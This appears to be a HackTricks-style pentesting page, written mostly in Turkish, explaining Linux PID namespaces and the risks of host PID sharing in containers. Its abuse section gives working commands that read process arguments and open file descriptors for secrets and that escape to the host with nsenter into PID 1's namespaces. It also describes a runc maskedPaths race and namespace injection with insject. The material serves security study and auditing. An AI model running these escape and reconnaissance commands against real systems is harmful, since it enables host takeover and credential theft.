# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

PID namespace, süreçlerin nasıl numaralandırıldığını ve hangi süreçlerin görülebilir olduğunu kontrol eder. Bu, bir container'ın gerçek bir makine olmamasına rağmen kendi PID 1'ine sahip olabilmesinin sebebidir. Namespace içinde workload, yerel bir süreç ağacı gibi görünen şeyi görür. Namespace dışında ise host hâlâ gerçek host PID'lerini ve tam süreç görünümünü görür.

Güvenlik açısından PID namespace önemlidir çünkü süreç görünürlüğü değerlidir. Bir workload host süreçlerini görebildiğinde, servis isimlerini, komut satırı argümanlarını, süreç argümanlarında geçen sırları, ortamdan türetilen durumu `/proc` üzerinden ve potansiyel namespace-entry hedeflerini gözlemleyebilir. Eğer sadece bu süreçleri görmekten daha fazlasını yapabiliyorsa — örneğin uygun koşullarda sinyal göndermek veya ptrace kullanmak gibi — sorun çok daha ciddi hâle gelir.

## İşleyiş

Yeni bir PID namespace kendi dahili süreç numaralandırmasıyla başlar. İçinde oluşturulan ilk süreç, namespace'in bakış açısından PID 1 olur; bu aynı zamanda öksüz kalan çocuklar ve sinyal davranışı için özel init-benzeri semantiklere sahip olduğu anlamına gelir. Bu, init süreçleri, zombie reaping ve neden bazen container'larda küçük init wrapper'larının kullanıldığı gibi birçok container tuhaflığını açıklar.

Önemli güvenlik dersi şudur: bir süreç yalnızca kendi PID ağacını gördüğü için izole görünse bile, bu izolasyon kasıtlı olarak kaldırılabilir. Docker bunu `--pid=host` ile açarken, Kubernetes bunu `hostPID: true` ile yapar. Container host PID namespace'ine katıldıktan sonra workload host süreçlerini doğrudan görür ve sonraki birçok saldırı yolu çok daha gerçekçi hâle gelir.

## Laboratuvar

Manuel olarak bir PID namespace oluşturmak için:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell artık özel bir süreç görünümü görüyor. `--mount-proc` bayrağı önemlidir çünkü yeni PID namespace ile eşleşen bir procfs örneğini mount eder; içeriden süreç listesinin tutarlı olmasını sağlar.

Konteyner davranışını karşılaştırmak için:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Fark hemen görülür ve anlaşılması kolaydır; bu yüzden bu, okuyucular için iyi bir ilk laboratuvar çalışmasıdır.

## Çalışma Zamanı Kullanımı

Docker, Podman, containerd ve CRI-O'daki normal containers kendi PID namespace'lerini alır. Kubernetes Pods da genellikle workload açıkça host PID paylaşımı talep etmedikçe izole bir PID görünümü elde eder. LXC/Incus ortamları aynı kernel primitive'ine dayanır; ancak system-container kullanım durumları daha karmaşık process ağaçları ortaya çıkarabilir ve daha fazla debugging kısayolunu teşvik edebilir.

Aynı kural her yerde geçerlidir: runtime PID namespace'ini izole etmeme seçimi kasıtlı olarak container sınırında bir daralma anlamına gelir.

## Yanlış Yapılandırmalar

Kanonik yanlış yapılandırma host PID paylaşımıdır. Ekipler bunu genellikle debugging, monitoring veya servis-yönetimi kolaylığı için haklı çıkarır, ancak bu her zaman önemli bir güvenlik istisnası olarak ele alınmalıdır. Konteynerin host süreçleri üzerinde hemen bir yazma yetkisi olmasa bile, sadece görünürlük bile sistem hakkında çok şey açığa çıkarabilir. `CAP_SYS_PTRACE` gibi yetenekler veya yararlı procfs erişimi eklendiğinde risk önemli ölçüde genişler.

Diğer bir hata, workload varsayılan olarak host süreçlerini kill veya ptrace edemediği için host PID paylaşımının zararsız olduğunu varsaymaktır. Bu sonuç, keşfin değerini, namespace-entry hedeflerinin kullanılabilirliğini ve PID görünürlüğünün diğer zayıflatılmış kontrollerle nasıl birleştiğini görmezden gelir.

## Suistimal

Eğer host PID namespace paylaşılıyorsa, bir saldırgan host süreçlerini inceleyebilir, süreç argümanlarını toplayabilir, ilginç servisleri tespit edebilir, `nsenter` için aday PID'leri bulabilir veya süreç görünürlüğünü ptrace ile ilişkili ayrıcalıklarla birleştirerek host veya komşu workload'lara müdahale edebilir. Bazı durumlarda, doğru uzun süre çalışan süreci görmek bile saldırı planının geri kalanını yeniden şekillendirmek için yeterlidir.

İlk pratik adım her zaman host süreçlerinin gerçekten görünür olduğunu teyit etmektir:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Ana makine PID'leri görünür hale geldiğinde, süreç argümanları ve namespace'e giriş hedefleri genellikle en yararlı bilgi kaynağı haline gelir:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Eğer `nsenter` mevcutsa ve yeterli ayrıcalık varsa, görünür bir host işleminin bir isim alanı köprüsü olarak kullanılıp kullanılamayacağını test edin:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Giriş engellense bile, host PID paylaşımı zaten değerlidir; çünkü servis düzenini, çalışma zamanı bileşenlerini ve sonraki hedef olarak seçilebilecek ayrıcalıklı süreçleri ortaya çıkarır.

Host PID görünürlüğü ayrıca file-descriptor abuse'ı daha gerçekçi hale getirir. Eğer ayrıcalıklı bir host süreci veya komşu bir iş yükü hassas bir dosya veya socket açık tutuyorsa, saldırgan `/proc/<pid>/fd/`'yi inceleyip sahipliğe, procfs mount options'a ve hedef servis modeline bağlı olarak bu handle'ı yeniden kullanabilir.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Bu komutlar yararlıdır çünkü `hidepid=1` veya `hidepid=2`'nin süreçler arası görünürlüğü azaltıp azaltmadığını ve açık durumda olan gizli dosyalar, loglar veya Unix sockets gibi bariz ilgi çekici deskriptörlerin hiç görünür olup olmadığını yanıtlar.

### Tam Örnek: host PID + `nsenter`

Host PID paylaşımı, işlem ayrıca host namespaces'e katılmak için yeterli ayrıcalıklara sahip olduğunda doğrudan bir host escape'e dönüşür:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Komut başarılı olursa, container işlemi artık host mount, UTS, network, IPC ve PID namespace'lerinde çalışmaktadır. Etki, host'un derhal ele geçirilmesidir.

Even when `nsenter` itself is missing, the same result may be achievable through the host binary if the host filesystem is mounted:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Güncel Çalışma Zamanı Notları

Bazı PID-namespace ile ilgili saldırılar geleneksel `hostPID: true` yanlış yapılandırmaları değil, konteyner kurulumu sırasında procfs korumalarının nasıl uygulandığına dair çalışma zamanı uygulama hatalarıdır.

#### `maskedPaths`'in host procfs'e yarışı

Zafiyetli `runc` sürümlerinde, konteyner imajını veya `runc exec` iş yükünü kontrol edebilen saldırganlar, konteyner tarafındaki `/dev/null`'ü `/proc/sys/kernel/core_pattern` gibi hassas bir procfs yoluna gösteren bir symlink ile değiştirerek masking aşamasıyla yarışabilirler. Yarış başarılı olursa, masked-path bind mount yanlış hedefe bağlanabilir ve host-genel procfs ayarlarını yeni konteynere açığa çıkarabilir.

İnceleme için faydalı komut:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Bu önemlidir çünkü nihai etki doğrudan bir procfs açığa çıkarılmasıyla aynı olabilir: yazılabilir `core_pattern` veya `sysrq-trigger`, ardından host üzerinde kod yürütme veya denial of service.

#### Namespace injection ile `insject`

Namespace injection araçları, örneğin `insject`, PID-namespace etkileşiminin her zaman işlem oluşturulmadan önce hedef namespace'e önceden girilmesini gerektirmediğini gösterir. Bir yardımcı daha sonra bağlanabilir, `setns()` kullanabilir ve hedef PID alanına görünürlüğü koruyarak çalıştırma yapabilir:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Bu tür bir teknik, özellikle runtime iş yükü başlatıldıktan sonra namespace context'e katılınması gereken ileri düzey hata ayıklama, offensive tooling ve post-exploitation workflows için önemlidir.

### İlgili FD Kötüye Kullanım Desenleri

Host PID'leri görünür olduğunda açıkça belirtilmeye değer iki desen vardır. Birincisi, ayrıcalıklı bir süreç `execve()` sırasında hassas bir dosya tanımlayıcısını açık tutabilir çünkü bu tanımlayıcı `O_CLOEXEC` olarak işaretlenmemiş olabilir. İkincisi, servisler dosya tanımlayıcılarını Unix soketleri üzerinden `SCM_RIGHTS` ile iletebilir. Her iki durumda da ilginç olan nesne artık yol adı değil; daha düşük ayrıcalığa sahip bir sürecin miras alabileceği veya alacağı zaten açık olan tutamaçtır.

Bu, container çalışmalarında önemlidir çünkü yol kendisi container dosya sisteminden doğrudan erişilebilir olmasa bile tutamaç `docker.sock`, ayrıcalıklı bir log, bir host gizli dosyası veya başka yüksek değerli bir nesneye işaret edebilir.

## Kontroller

Bu komutların amacı, sürecin özel bir PID görünümüne sahip olup olmadığını veya çok daha geniş bir süreç kapsamını zaten listeleyip listeleyemeyeceğini belirlemektir.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Burada ilginç olan:

- Eğer süreç listesi bariz host servisleri içeriyorsa, host PID paylaşımı muhtemelen zaten etkin durumdadır.
- Sadece küçük, konteyner-yerel bir işlem ağacı görmek normal baz hattır; `systemd`, `dockerd` veya ilgisiz daemon'ların görünmesi normal değildir.
- Host PID'ler görünür hale geldiğinde, salt okunur işlem bilgileri bile faydalı keşif verisi olur.

Eğer host PID paylaşımı ile çalışan bir konteyner keşfederseniz, bunu kozmetik bir fark olarak ele almayın. Bu, iş yükünün gözlemleyebileceği ve potansiyel olarak etkileyebileceği konularda büyük bir değişikliktir.
